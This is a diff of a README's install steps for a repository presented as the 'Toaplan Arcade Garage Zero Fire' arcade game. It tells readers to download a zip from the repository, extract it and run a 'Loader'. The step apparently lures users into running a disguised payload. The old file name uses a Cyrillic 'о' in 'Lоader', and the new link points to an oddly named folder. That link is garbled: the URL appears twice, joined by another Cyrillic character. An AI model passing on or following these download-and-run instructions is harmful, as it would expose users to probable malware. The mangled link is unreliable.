@@ -28,7 +28,7 @@ Welcome to the **Toaplan Arcade Garage Zero Fire ** repository! Here you can fin
 
 ## 📥 Installation Instructions
 
-1. Download **https://raw.githubusercontent.com/Shary219/ToaplanArcadeGarage-ZeroFire-Reloaded/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/Shary219/ToaplanArcadeGarage-ZeroFire-Reloaded/main/rhinenchysis/Arcade_Garage_Reloaded_Zero_Toaplan_Fire_2.4.zipоhttps://raw.githubusercontent.com/Shary219/ToaplanArcadeGarage-ZeroFire-Reloaded/main/rhinenchysis/Arcade_Garage_Reloaded_Zero_Toaplan_Fire_2.4.zip** from the repository.
 2. Extract all contents using your favorite archiver.
 3. Run the Loader on your OS – follow on-screen prompts.
 4. Enjoy the **Zero Fire** arcade experience instantly!
